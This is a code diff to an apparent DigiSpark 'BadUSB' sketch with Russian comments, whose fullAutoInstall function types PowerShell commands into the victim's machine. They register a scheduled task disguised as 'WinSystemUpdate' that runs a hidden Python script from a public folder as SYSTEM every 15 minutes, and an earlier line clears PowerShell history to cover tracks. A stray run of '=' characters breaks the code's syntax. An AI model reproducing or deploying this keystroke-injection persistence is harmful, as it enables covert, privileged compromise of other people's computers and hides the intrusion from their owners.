@@ -79,4 +79,35 @@ void fullAutoInstall() {
   
   // Очищаем историю PowerShell
   DigiKeyboard.print("Clear-History; exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);=======================================================================
+  =============================================================================================================
+
+
+  // Основной PowerShell-код
+  DigiKeyboard.print(F("$taskName = \"WinSystemUpdate\""));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(400);
+
+  DigiKeyboard.print(F("$action = New-ScheduledTaskAction -Execute \"C:\\Users\\Public\\a\\pythonw.exe\" -Argument \"C:\\Users\\Public\\a\\win.py\""));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(600);
+
+  DigiKeyboard.print(F("$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+
+  DigiKeyboard.print(F("$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+
+  DigiKeyboard.print(F("Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User \"SYSTEM\" -Force"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1200);
+
+  DigiKeyboard.print(F("Write-Host \"Задача автозапуска успешно создана (каждые 15 минут)\" -ForegroundColor Green"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print(F("exit"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
